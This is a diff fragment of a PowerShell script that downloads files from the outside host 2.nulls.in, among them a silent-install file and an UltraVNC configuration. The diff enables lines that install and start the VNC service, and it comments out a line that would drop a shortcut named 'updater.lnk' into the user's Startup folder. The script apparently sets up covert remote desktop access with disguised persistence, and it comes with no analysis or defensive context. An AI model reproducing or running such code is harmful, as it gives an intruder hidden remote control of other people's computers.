@@ -7,11 +7,11 @@ $client.DownloadFile("http://2.nulls.in:5904/silentinstall.inf","$Env:USERPROFIL
 Start-Sleep -Seconds 3 -ErrorAction Stop
 $client.DownloadFile("http://2.nulls.in:5904/ultravnc.ini","C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini") ;
 Stop-Service uvnc_service
-#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install
+& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install
 Start-Sleep -Seconds 2 -ErrorAction Stop
-#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -stopservice
+& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -stopservice
 $client.DownloadFile("http://2.nulls.in:5904/ultravnc.ini","C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini") ;
 Start-Sleep -Seconds 2 -ErrorAction Stop
-$client.DownloadFile("http://2.nulls.in:5904/updater.lnk","$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk") ;
+#$client.DownloadFile("http://2.nulls.in:5904/updater.lnk","$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk") ;
 Start-Service uvnc_service
 exit;
